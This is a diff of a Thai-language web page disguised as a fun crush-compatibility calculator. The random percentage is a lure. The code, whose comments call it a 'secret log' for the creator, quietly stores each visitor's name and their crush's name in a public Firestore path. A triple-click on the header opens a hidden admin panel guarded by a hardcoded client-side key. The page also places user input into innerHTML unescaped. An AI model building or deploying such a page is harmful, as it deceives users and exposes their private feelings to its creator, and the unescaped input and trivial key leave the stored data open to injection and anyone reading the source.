@@ -3,371 +3,390 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>คนที่แอบชอบ (Secret Crush)</title>
+    <title>คนที่แอบชอบ - เครื่องคำนวณความเข้ากัน</title>
+    <!-- Load Tailwind CSS -->
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
+        /* Custom styles for better aesthetics and responsiveness */
         body {
             font-family: 'Inter', sans-serif;
-            background-color: #f7f7f9;
+            background-color: #f7fafc;
         }
-        .container-box {
+        .card {
+            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
+            border-radius: 1rem;
             background-color: white;
             padding: 1.5rem;
-            border-radius: 1rem;
-            box-shadow: 0 10px 15px rgba(0, 0, 0, 0.1);
+            max-width: 90%;
+            margin: 2rem auto;
+            animation: fadeIn 1s ease-out;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
         }
         .result-box {
-            min-height: 80px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            flex-direction: column;
-            border-radius: 0.75rem;
-            transition: all 0.3s ease-in-out;
-            font-weight: 700;
+            background-color: #ffe4e6; /* Rose 100 */
+            border: 2px solid #fda4af; /* Rose 300 */
+            color: #e11d48; /* Rose 600 */
+            padding: 1rem;
+            margin-top: 1rem;
+            border-radius: 0.5rem;
             text-align: center;
+            font-weight: bold;
+            font-size: 1.5rem;
         }
-        .btn-primary {
-            background-color: #f06292; /* Pink */
-            color: white;
-            padding: 0.75rem 1.5rem;
-            border-radius: 0.75rem;
-            font-weight: 600;
-            transition: background-color 0.2s;
-            cursor: pointer;
-            box-shadow: 0 4px 6px rgba(240, 98, 146, 0.4);
+        /* Style for the secret header, ensuring it looks like normal text */
+        #main-header {
+            cursor: default; 
+            user-select: none; /* Prevents text selection on repeated click */
         }
-        .btn-primary:hover {
-            background-color: #d84370;
-        }
-        .loading-spinner {
-            border: 4px solid rgba(255, 255, 255, 0.3);
-            border-top: 4px solid #fff;
-            border-radius: 50%;
-            width: 20px;
-            height: 20px;
-            animation: spin 1s linear infinite;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        /* Mobile-first responsiveness */
-        @media (max-width: 640px) {
-            .container-box {
-                margin: 0.5rem;
-                padding: 1rem;
-            }
+        /* Style for preventing background scroll when modal is active */
+        .overflow-hidden-body {
+            overflow: hidden !important;
         }
     </style>
 </head>
-<body class="p-4 flex flex-col items-center min-h-screen">
+<body id="body">
 
-    <div id="main-app" class="w-full max-w-md mt-8">
+    <div id="app" class="min-h-screen flex flex-col items-center pt-8 pb-8">
 
-        <!-- Header -->
-        <h1 class="text-3xl font-bold text-center text-pink-500 mb-6">💖 คนที่แอบชอบ</h1>
+        <!-- Main Love Calculator Card (User View) -->
+        <div class="card w-full lg:w-1/2">
+            <!-- This is the secret trigger element -->
+            <h1 id="main-header" class="text-3xl font-extrabold text-center text-pink-600 mb-6">
+                เครื่องคำนวณความเข้ากันของคนที่แอบชอบ 💖
+            </h1>
+            <p class="text-center text-gray-500 mb-6">
+                ใส่ชื่อของคุณและชื่อคนที่คุณแอบชอบ เพื่อดูว่าความเข้ากันอยู่ในระดับไหน!
+            </p>
 
-        <!-- User Information Box -->
-        <div id="user-info-box" class="container-box mb-6 text-sm text-center">
-            <p id="auth-status" class="text-gray-600 mb-1">สถานะ: <span class="font-semibold text-red-500">กำลังเริ่มต้นระบบ...</span></p>
-            <p class="text-xs text-gray-500">นี่คือ User ID ชั่วคราวของคุณ:</p>
-            <p id="user-uid" class="font-mono text-xs p-1 bg-gray-100 rounded-lg break-all">กำลังโหลด...</p>
-        </div>
-
-        <!-- Compatibility Form -->
-        <div id="compatibility-form-container" class="container-box mb-6">
-            <h2 class="text-xl font-semibold mb-4 text-gray-700">วัดระดับความเข้ากัน!</h2>
-            <form id="crush-form" class="space-y-4">
+            <form id="love-form" class="space-y-4">
                 <div>
-                    <label for="userName" class="block text-sm font-medium text-gray-700 mb-1">ชื่อของคุณ:</label>
-                    <input type="text" id="userName" required
-                           class="w-full p-3 border border-gray-300 rounded-lg focus:ring-pink-500 focus:border-pink-500"
-                           placeholder="เช่น: สมชาย">
+                    <label for="user-name" class="block text-sm font-medium text-gray-700 mb-1">ชื่อของคุณ:</label>
+                    <input type="text" id="user-name" required placeholder="เช่น ไก่"
+                           class="w-full p-3 border border-gray-300 rounded-lg focus:ring-pink-500 focus:border-pink-500 transition duration-150">
                 </div>
                 <div>
-                    <label for="crushName" class="block text-sm font-medium text-gray-700 mb-1">ชื่อคนที่คุณแอบชอบ:</label>
-                    <input type="text" id="crushName" required
-                           class="w-full p-3 border border-gray-300 rounded-lg focus:ring-pink-500 focus:border-pink-500"
-                           placeholder="เช่น: สมหญิง">
+                    <label for="crush-name" class="block text-sm font-medium text-gray-700 mb-1">ชื่อคนที่คุณแอบชอบ:</label>
+                    <input type="text" id="crush-name" required placeholder="เช่น ไข่"
+                           class="w-full p-3 border border-gray-300 rounded-lg focus:ring-pink-500 focus:border-pink-500 transition duration-150">
                 </div>
-                <button type="submit" id="submit-btn" class="btn-primary w-full flex items-center justify-center">
-                    <span id="btn-text">คำนวณ!</span>
-                    <div id="btn-loading" class="loading-spinner hidden ml-2"></div>
+                <button type="submit" id="submit-button"
+                        class="w-full py-3 px-4 bg-pink-600 text-white font-bold rounded-lg hover:bg-pink-700 transition duration-200 focus:outline-none focus:ring-2 focus:ring-pink-500 focus:ring-offset-2">
+                    คำนวณความเข้ากัน!
                 </button>
             </form>
-        </div>
 
-        <!-- Result Display -->
-        <div class="container-box mb-8">
-            <h2 class="text-xl font-semibold mb-4 text-gray-700">ผลลัพธ์ความเข้ากันได้</h2>
-            <div id="result-display" class="result-box bg-pink-100 border-2 border-pink-300">
-                <p class="text-gray-500">กรุณาใส่ชื่อและกดคำนวณ...</p>
+            <!-- Result Display -->
+            <div id="result-container" class="mt-6 hidden">
+                <div class="result-box" id="result-text"></div>
+            </div>
+
+            <!-- Custom Modal for Messages (No alert/confirm) -->
+            <div id="message-modal" class="hidden fixed inset-0 bg-gray-600 bg-opacity-50 flex items-center justify-center p-4 z-50">
+                <div class="bg-white p-6 rounded-xl shadow-2xl max-w-sm w-full">
+                    <h3 class="text-xl font-bold text-gray-800 mb-3">แจ้งเตือน</h3>
+                    <p id="modal-message" class="text-gray-600 mb-4"></p>
+                    <button onclick="closeModal('message-modal')"
+                            class="w-full py-2 bg-pink-500 text-white rounded-lg hover:bg-pink-600">
+                        ตกลง
+                    </button>
+                </div>
+            </div>
+
+             <!-- Admin Key Input Modal -->
+             <div id="admin-key-modal" class="hidden fixed inset-0 bg-gray-600 bg-opacity-50 flex items-center justify-center p-4 z-50">
+                <div class="bg-white p-6 rounded-xl shadow-2xl max-w-lg w-full">
+                    <h3 class="text-xl font-bold text-gray-800 mb-3 text-center">🔐 ล็อกอินผู้สร้าง</h3>
+                    <p class="text-gray-600 mb-4 text-sm">กรุณาใส่รหัสผู้สร้าง (Admin Key) ของคุณเพื่อเข้าถึงข้อมูลทั้งหมด:</p>
+                    <input type="password" id="admin-key-input" placeholder="Admin Key"
+                           class="w-full p-3 border border-gray-300 rounded-lg focus:ring-pink-500 focus:border-pink-500 transition duration-150 mb-4">
+                    <div class="flex space-x-2">
+                        <button id="admin-key-submit"
+                                class="flex-1 py-2 bg-pink-600 text-white rounded-lg hover:bg-pink-700 transition duration-200">
+                            เข้าสู่ระบบ
+                        </button>
+                        <button onclick="closeModal('admin-key-modal')"
+                                class="flex-1 py-2 bg-gray-300 text-gray-700 rounded-lg hover:bg-gray-400 transition duration-200">
+                            ยกเลิก
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Admin View Panel (Creator Only) -->
+        <div id="admin-panel" class="card w-full lg:w-3/4 mt-8 hidden">
+            <h2 class="text-2xl font-bold text-gray-800 mb-4 border-b pb-2">ข้อมูลความเข้ากันทั้งหมด (สำหรับผู้สร้าง)</h2>
+            <p id="admin-info" class="text-sm text-gray-500 mb-4">กำลังโหลดข้อมูล... (User ID ของคุณ: <span id="current-user-id" class="font-mono text-xs bg-gray-100 p-1 rounded">N/A</span>)</p>
+            <div id="matches-list" class="space-y-3">
+                <!-- Data will be injected here -->
+                <p class="text-center text-gray-400" id="no-data-msg">ยังไม่มีข้อมูลการคำนวณ</p>
             </div>
         </div>
 
-        <!-- Admin Table (Hidden by default) -->
-        <div id="admin-view" class="w-full mt-8 hidden">
-            <h2 class="text-2xl font-bold mb-4 text-center text-red-600">🚨 ข้อมูลลับ (Admin View) 🚨</h2>
-            <p class="text-sm text-center text-gray-600 mb-4">ตารางนี้จะอัปเดตแบบเรียลไทม์เมื่อมีคนคำนวณ</p>
-            <div class="container-box p-0 overflow-x-auto">
-                <table class="min-w-full divide-y divide-gray-200">
-                    <thead class="bg-gray-50">
-                        <tr>
-                            <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">เวลา</th>
-                            <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">ชื่อผู้ใช้</th>
-                            <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">ชื่อคนที่ชอบ</th>
-                            <th class="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">%</th>
-                        </tr>
-                    </thead>
-                    <tbody id="admin-results-tbody" class="bg-white divide-y divide-gray-200">
-                        <!-- Data rows will be inserted here -->
-                        <tr><td colspan="4" class="text-center py-4 text-gray-400">กำลังโหลดข้อมูลลับ...</td></tr>
-                    </tbody>
-                </table>
-            </div>
-        </div>
     </div>
 
-
+    <!-- Firebase SDK Imports -->
     <script type="module">
-        // --- ส่วนที่ 1: การตั้งค่า Firebase (สำคัญมาก ต้องแก้ไข) ---
-        // 💡 1.1 แทนที่ค่าใน object นี้ด้วย config ของ Firebase Project ของคุณ 💡
-        const firebaseConfig = {
-          apiKey: "YOUR_API_KEY", 
-          authDomain: "YOUR_PROJECT_ID.firebaseapp.com",
-          projectId: "YOUR_PROJECT_ID",
-          storageBucket: "YOUR_PROJECT_ID.appspot.com",
-          messagingSenderId: "YOUR_MESSAGING_SENDER_ID",
-          appId: "YOUR_APP_ID"
-        };
-        
-        // 💡 1.2 กำหนดรหัสผู้ดูแล (Admin User ID) 💡
-        // คัดลอก User ID ของคุณที่แสดงขึ้นมาในหน้าเว็บเมื่อรันครั้งแรก แล้วมาใส่แทนที่
-        const ADMIN_UID = 'YOUR_ADMIN_UID_HERE'; 
-
-        // -----------------------------------------------------------
-
-
-        let app, db, auth;
-        let userId = null;
-        let isAuthReady = false;
-
-        // ตัวแปรสำหรับระบุ Collection Path ใน Firestore (ใช้ projectId เป็นตัวอ้างอิง)
-        const projectAppId = firebaseConfig.projectId || 'default-project-id';
-
-        // Firebase Imports
         import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
-        import { getAuth, signInAnonymously, onAuthStateChanged, setPersistence, browserSessionPersistence } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
-        import { getFirestore, collection, addDoc, onSnapshot, query, serverTimestamp, setLogLevel } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
+        import { getAuth, signInAnonymously, signInWithCustomToken, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
+        import { getFirestore, addDoc, onSnapshot, collection, query, serverTimestamp, setLogLevel } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
 
-        // DOM elements
-        const userInfoBox = document.getElementById('user-info-box');
-        const userUidDisplay = document.getElementById('user-uid');
-        const authStatus = document.getElementById('auth-status');
-        const adminView = document.getElementById('admin-view');
-        const adminResultsTbody = document.getElementById('admin-results-tbody');
-        const crushForm = document.getElementById('crush-form');
-        const resultDisplay = document.getElementById('result-display');
-        const submitBtn = document.getElementById('submit-btn');
-        const btnText = document.getElementById('btn-text');
-        const btnLoading = document.getElementById('btn-loading');
+        // Global variables provided by the environment
+        const appId = typeof __app_id !== 'undefined' ? __app_id : 'default-app-id';
+        const firebaseConfig = typeof __firebase_config !== 'undefined' ? JSON.parse(__firebase_config) : null;
+        // Fix: Ensure the initialAuthToken is correctly assigned from the global variable
+        const initialAuthToken = typeof __initial_auth_token !== 'undefined' ? __initial_auth_token : null; 
 
-        // 2. Initialise Firebase and Authentication
-        async function initializeAppAndAuth() {
-            // Check for critical config availability immediately
-            if (!firebaseConfig.apiKey || !firebaseConfig.projectId || firebaseConfig.apiKey.includes('YOUR_API_KEY')) {
-                userUidDisplay.textContent = 'N/A';
-                authStatus.innerHTML = '<span class="font-semibold text-red-500">ข้อผิดพลาด: ต้องกำหนดค่า Firebase Config!</span>';
-                const errorMessage = document.createElement('p');
-                errorMessage.className = 'text-center text-sm text-red-700 mt-4 p-2 bg-red-100 rounded-lg';
-                errorMessage.textContent = 'กรุณาแทนที่ YOUR_API_KEY และ YOUR_PROJECT_ID ด้วยข้อมูล Firebase Project ของคุณ (ดูขั้นตอนที่ 2)';
-                userInfoBox.after(errorMessage);
-                return;
-            }
+        // --- HARDCODED ADMIN KEY ---
+        const CREATOR_ADMIN_KEY = '2552'; 
 
-            try {
-                app = initializeApp(firebaseConfig);
-                db = getFirestore(app);
-                auth = getAuth(app);
+        let db, auth, userId = 'loading';
+        let isAdminLoggedIn = false; 
 
-                // สำหรับ GitHub Pages เราใช้ Anonymous sign-in เพื่อให้ทุกคนมี ID
-                await setPersistence(auth, browserSessionPersistence);
-                await signInAnonymously(auth);
+        // Variables for the triple-click detection
+        let clickCount = 0;
+        let lastClickTime = 0;
+        const TRIPLE_CLICK_INTERVAL = 400; // milliseconds
 
-                // Set up Auth State Listener
-                onAuthStateChanged(auth, (user) => {
-                    if (user) {
-                        userId = user.uid;
-                        isAuthReady = true;
+        // Set log level for debugging Firestore issues
+        setLogLevel('Debug');
 
-                        userUidDisplay.textContent = userId;
-                        authStatus.innerHTML = '<span class="font-semibold text-green-600">เชื่อมต่อแล้ว (ใช้ ID นี้เพื่อเป็น Admin)</span>';
-
-                        // Show admin view if current user is the admin
-                        if (userId === ADMIN_UID && ADMIN_UID !== 'YOUR_ADMIN_UID_HERE') {
-                            adminView.classList.remove('hidden');
-                            listenForAdminData(); 
-                        } else if (ADMIN_UID === 'YOUR_ADMIN_UID_HERE') {
-                             authStatus.innerHTML = '<span class="font-semibold text-yellow-500">คัดลอก ID ข้างบนไปแทนที่ ADMIN_UID ในโค้ด!</span>';
-                        }
-
-                    } else {
-                        isAuthReady = true;
-                        userUidDisplay.textContent = 'ไม่สามารถยืนยันตัวตนได้';
-                        authStatus.innerHTML = '<span class="font-semibold text-red-500">เกิดข้อผิดพลาดในการยืนยันตัวตน</span>';
-                    }
-                });
-
-            } catch (error) {
-                console.error("Firebase Initialization Error:", error);
-                authStatus.innerHTML = `<span class="font-semibold text-red-500">ข้อผิดพลาด: ${error.message.substring(0, 50)}...</span>`;
-            }
-        }
+        // --- Utility Functions (Fixed to manage body scroll reliably) ---
         
-        // 3. Data Submission Function (Write to Firestore)
-        async function submitCrushData(userName, crushName, percentage) {
-            if (!isAuthReady || !db || !userId) {
-                console.error("Firestore not ready or user not authenticated.");
+        function openModal(modalId) {
+            // Close other modals first (safety check against stuck overlays)
+            document.getElementById('message-modal').classList.add('hidden');
+            document.getElementById('admin-key-modal').classList.add('hidden');
+            
+            // Add scroll lock to body
+            document.getElementById('body').classList.add('overflow-hidden-body');
+            
+            // Show the requested modal
+            document.getElementById(modalId).classList.remove('hidden');
+        }
+
+        window.closeModal = function(modalId) {
+            document.getElementById(modalId).classList.add('hidden');
+            // Remove scroll lock from body
+            document.getElementById('body').classList.remove('overflow-hidden-body');
+        }
+
+        function showMessage(message) {
+            document.getElementById('modal-message').textContent = message;
+            openModal('message-modal');
+        }
+
+        function getRandomCompatibility() {
+            // Generates a compatibility percentage between 40% and 100%
+            return Math.floor(Math.random() * (100 - 40 + 1)) + 40;
+        }
+
+        // --- Firebase Initialization and Authentication ---
+
+        if (firebaseConfig) {
+            const app = initializeApp(firebaseConfig);
+            db = getFirestore(app);
+            auth = getAuth(app);
+
+            // Handle Authentication and set up listeners
+            onAuthStateChanged(auth, async (user) => {
+                if (user) {
+                    userId = user.uid;
+                    document.getElementById('current-user-id').textContent = userId;
+                } else {
+                    // Sign in with custom token if available, otherwise sign in anonymously
+                    try {
+                        if (initialAuthToken) {
+                            await signInWithCustomToken(auth, initialAuthToken);
+                        } else {
+                            await signInAnonymously(auth);
+                        }
+                    } catch (error) {
+                        console.error("Firebase Auth Error:", error);
+                        showMessage("การตรวจสอบสิทธิ์ Firebase ล้มเหลว กรุณาลองใหม่อีกครั้ง");
+                    }
+                }
+            });
+
+        } else {
+            console.error("Firebase configuration is missing.");
+            showMessage("ไม่พบการตั้งค่า Firebase ข้อมูลจะไม่ถูกบันทึก (แต่แอปยังทำงานได้)");
+        }
+
+        // --- Firestore Data Functions ---
+
+        /**
+         * Saves the match result to the public Firestore collection.
+         */
+        async function saveMatch(userName, crushName, compatibility) {
+            if (!db || userId === 'loading') {
+                console.warn("Firestore not ready or user ID is loading. Data not saved.");
                 return;
             }
 
-            // Path: /artifacts/{projectId}/public/data/compatibility_results
-            const resultsCollectionRef = collection(db, `artifacts/${projectAppId}/public/data/compatibility_results`);
+            // Path for public data: /artifacts/{appId}/public/data/crush_matches
+            const collectionPath = `artifacts/${appId}/public/data/crush_matches`;
 
             try {
-                await addDoc(resultsCollectionRef, {
-                    userName: userName, // <--- ข้อมูลลับ
-                    crushName: crushName, // <--- ข้อมูลลับ
-                    percentage: percentage,
+                await addDoc(collection(db, collectionPath), {
+                    userName: userName,
+                    crushName: crushName,
+                    compatibility: compatibility,
                     timestamp: serverTimestamp(),
-                    submitterId: userId
+                    submittedBy: userId,
                 });
-            } catch (error) {
-                console.error("Error saving data to Firestore:", error);
-                displayMessage('error', '❌ เกิดข้อผิดพลาดในการบันทึกข้อมูล');
+                console.log("Match data saved successfully.");
+            } catch (e) {
+                console.error("Error adding document: ", e);
+                showMessage("บันทึกข้อมูลไม่สำเร็จ: " + e.message);
             }
         }
 
-        // 4. Admin Data Listener (Read from Firestore)
-        function listenForAdminData() {
+        /**
+         * Sets up a real-time listener for the Admin Panel.
+         * This function should only be called after the Admin Key is validated.
+         */
+        function setupAdminDataListener() {
             if (!db) return;
 
-            const resultsCollectionRef = collection(db, `artifacts/${projectAppId}/public/data/compatibility_results`);
-            const q = query(resultsCollectionRef);
+            const collectionPath = `artifacts/${appId}/public/data/crush_matches`;
+            const q = query(collection(db, collectionPath));
 
             onSnapshot(q, (snapshot) => {
-                const results = [];
-                snapshot.forEach((doc) => {
-                    results.push(doc.data());
+                const matchesListDiv = document.getElementById('matches-list');
+                const noDataMsg = document.getElementById('no-data-msg');
+                let htmlContent = '';
+                let hasData = false;
+
+                snapshot.docs.forEach((doc) => {
+                    hasData = true;
+                    const data = doc.data();
+                    const timestamp = data.timestamp ? new Date(data.timestamp.seconds * 1000).toLocaleString('th-TH', { dateStyle: 'short', timeStyle: 'short' }) : 'ไม่ทราบเวลา';
+
+                    // Display all sensitive information for the creator
+                    htmlContent += `
+                        <div class="p-3 bg-gray-50 border border-gray-200 rounded-lg text-sm">
+                            <p class="font-semibold text-gray-800">${data.userName} แอบชอบ ${data.crushName}</p>
+                            <p class="text-pink-600">ความเข้ากัน: ${data.compatibility}%</p>
+                            <p class="text-xs text-gray-500">บันทึกเมื่อ: ${timestamp} | User ID: ${data.submittedBy}</p>
+                        </div>
+                    `;
                 });
 
-                results.sort((a, b) => (b.timestamp?.seconds || 0) - (a.timestamp?.seconds || 0));
+                matchesListDiv.innerHTML = htmlContent;
 
-                renderAdminTable(results);
-            }, (error) => {
-                console.error("Error listening to admin data:", error);
-                adminResultsTbody.innerHTML = `<tr><td colspan="4" class="text-center py-4 text-red-500">ข้อผิดพลาดในการดึงข้อมูล: ${error.message.substring(0, 50)}...</td></tr>`;
-            });
-        }
-
-        // Helper Functions (Same as before)
-        function renderAdminTable(data) {
-            adminResultsTbody.innerHTML = ''; 
-            if (data.length === 0) {
-                adminResultsTbody.innerHTML = '<tr><td colspan="4" class="text-center py-4 text-gray-400">ยังไม่มีใครส่งข้อมูลเลย</td></tr>';
-                return;
-            }
-
-            data.forEach(item => {
-                const date = item.timestamp?.toDate ? item.timestamp.toDate().toLocaleString('th-TH') : 'N/A';
-                const row = document.createElement('tr');
-                row.className = 'hover:bg-pink-50';
-                row.innerHTML = `
-                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-900">${date}</td>
-                    <td class="px-6 py-4 whitespace-nowrap text-sm font-medium text-gray-900">${item.userName || 'ไม่ระบุ'}</td>
-                    <td class="px-6 py-4 whitespace-nowrap text-sm text-gray-700">${item.crushName || 'ไม่ระบุ'}</td>
-                    <td class="px-6 py-4 whitespace-nowrap text-sm font-bold text-red-500">${item.percentage}%</td>
-                `;
-                adminResultsTbody.appendChild(row);
-            });
-        }
-
-        function displayMessage(type, message, percentage = null) {
-            resultDisplay.className = 'result-box'; 
-            resultDisplay.innerHTML = '';
-            
-            let colorClass, icon, description = '';
-
-            if (type === 'success') {
-                if (percentage >= 80) {
-                    colorClass = 'bg-red-200 border-red-500 text-red-800';
-                    icon = '🔥';
-                    description = 'เข้ากันสุดๆ! พุ่งชนเลย!';
-                } else if (percentage >= 50) {
-                    colorClass = 'bg-yellow-100 border-yellow-400 text-yellow-800';
-                    icon = '😊';
-                    description = 'พอใช้ได้ ลองคุยกันดูนะ';
+                if (hasData) {
+                    noDataMsg.classList.add('hidden');
                 } else {
-                    colorClass = 'bg-blue-100 border-blue-400 text-blue-800';
-                    icon = '💔';
-                    description = 'ความเข้ากันอาจไม่สูง แต่ความพยายามสำคัญกว่านะ!';
+                    noDataMsg.classList.remove('hidden');
+                    matchesListDiv.innerHTML = ''; // Ensure list is cleared if no data
                 }
-
-                resultDisplay.classList.add(colorClass);
-                resultDisplay.innerHTML = `
-                    <p class="text-4xl mb-2">${icon}</p>
-                    <p class="text-2xl font-extrabold">${percentage}%</p>
-                    <p class="text-md">${description}</p>
-                `;
-
-            } else if (type === 'error') {
-                resultDisplay.classList.add('bg-red-100 border-red-400 text-red-600');
-                resultDisplay.innerHTML = `<p>${message}</p>`;
-            }
+            }, (error) => {
+                console.error("Error listening to collection: ", error);
+                matchesListDiv.innerHTML = `<p class="text-red-500">เกิดข้อผิดพลาดในการโหลดข้อมูล: ${error.message}</p>`;
+            });
         }
-        
-        // 5. Form Submission Handler
-        crushForm.addEventListener('submit', async (e) => {
-            e.preventDefault();
 
-            if (!isAuthReady) {
-                displayMessage('error', 'ระบบกำลังโหลด Firebase กรุณารอสักครู่');
+
+        // --- Event Listeners and Main Logic ---
+
+        document.getElementById('love-form').addEventListener('submit', async function(event) {
+            event.preventDefault();
+
+            const userName = document.getElementById('user-name').value.trim();
+            const crushName = document.getElementById('crush-name').value.trim();
+
+            if (userName === "" || crushName === "") {
+                showMessage("กรุณากรอกชื่อทั้งสองช่องให้ครบถ้วนก่อนคำนวณ");
                 return;
             }
 
-            const userName = document.getElementById('userName').value.trim();
-            const crushName = document.getElementById('crushName').value.trim();
+            // 1. Calculate and Display Result (The part the user sees)
+            const compatibility = getRandomCompatibility();
+            const resultText = document.getElementById('result-text');
+            const resultContainer = document.getElementById('result-container');
 
-            if (!userName || !crushName) {
-                displayMessage('error', 'กรุณากรอกชื่อทั้งสองช่อง');
-                return;
-            }
+            resultText.innerHTML = `
+                <div class="text-3xl font-extrabold">${userName} & ${crushName}</div>
+                <div class="mt-2 text-6xl font-black">${compatibility}%</div>
+                <div class="mt-2 text-xl">${getCompatibilityMessage(compatibility)}</div>
+            `;
+            resultContainer.classList.remove('hidden');
 
-            // Show loading state
-            submitBtn.disabled = true;
-            btnText.classList.add('hidden');
-            btnLoading.classList.remove('hidden');
+            // 2. Save data to Firestore (The part only the creator sees)
+            await saveMatch(userName, crushName, compatibility);
 
-            // 1. Calculate Random Percentage (This is the visible result)
-            const percentage = Math.floor(Math.random() * 100) + 1;
-
-            // 2. Display the result
-            displayMessage('success', 'ผลลัพธ์การคำนวณ', percentage);
-
-            // 3. Save data to Firestore (This is the secret log)
-            await submitCrushData(userName, crushName, percentage);
-            
-            // Restore button state
-            submitBtn.disabled = false;
-            btnText.classList.remove('hidden');
-            btnLoading.classList.add('hidden');
+            // Clear the form after submission
+            document.getElementById('love-form').reset();
         });
 
-        // Initialize the app when the window loads
-        window.onload = initializeAppAndAuth;
+        /**
+         * Provides a fun message based on the percentage.
+         */
+        function getCompatibilityMessage(percent) {
+            if (percent >= 90) return "ว้าว! พรหมลิขิตชัดๆ! เหมาะสมกันอย่างยิ่งยวด! 💍";
+            if (percent >= 75) return "สุดยอด! เข้ากันได้ดีมาก ลองทักไปคุยดูเลยไหม? 💬";
+            if (percent >= 60) return "พอดี๊พอดี! มีโอกาสพัฒนาสูง ต้องพยายามอีกหน่อยนะ! ✨";
+            if (percent >= 40) return "ก็... เป็นเพื่อนที่ดีต่อกันได้แน่นอน! 😉";
+            return "เป็นเปอร์เซ็นต์ที่ต่ำ แต่ความรักแท้จริงวัดด้วยตัวเลขไม่ได้นะ! สู้ๆ! 💪";
+        }
 
+        // --- Triple Click Admin Trigger Logic ---
+        document.getElementById('main-header').addEventListener('click', function(e) {
+            
+            // CRITICAL FIX: Block triple click if any modal is currently visible (i.e. blocking screen interaction)
+            if (!document.getElementById('message-modal').classList.contains('hidden') || 
+                !document.getElementById('admin-key-modal').classList.contains('hidden')) {
+                return; 
+            }
+
+            const currentTime = new Date().getTime();
+
+            if (currentTime - lastClickTime < TRIPLE_CLICK_INTERVAL) {
+                clickCount++;
+            } else {
+                // If clicks are too slow, reset the counter
+                clickCount = 1;
+            }
+
+            lastClickTime = currentTime;
+
+            if (clickCount === 3) {
+                clickCount = 0; // Reset counter after successful triple-click
+                
+                const adminPanel = document.getElementById('admin-panel');
+                
+                if (isAdminLoggedIn) {
+                    // If already logged in, just toggle the panel visibility
+                    adminPanel.classList.toggle('hidden');
+                } else {
+                    // If not logged in, show the key input modal
+                    openModal('admin-key-modal');
+                    document.getElementById('admin-key-input').value = ''; 
+                    document.getElementById('admin-key-input').focus();
+                }
+            }
+        });
+
+        // Handle Admin Key Submission
+        document.getElementById('admin-key-submit').addEventListener('click', function() {
+            const keyInput = document.getElementById('admin-key-input').value.trim();
+
+            if (keyInput === CREATOR_ADMIN_KEY) {
+                isAdminLoggedIn = true;
+                closeModal('admin-key-modal'); // Use the closing function to restore scroll
+                document.getElementById('admin-panel').classList.remove('hidden');
+
+                // Start fetching data only when the Admin Key is correct
+                setupAdminDataListener();
+            } else {
+                showMessage("รหัสผู้สร้างไม่ถูกต้อง! กรุณาลองใหม่อีกครั้ง");
+                document.getElementById('admin-key-input').value = ''; // Clear wrong key
+            }
+        });
     </script>
 </body>
 </html>
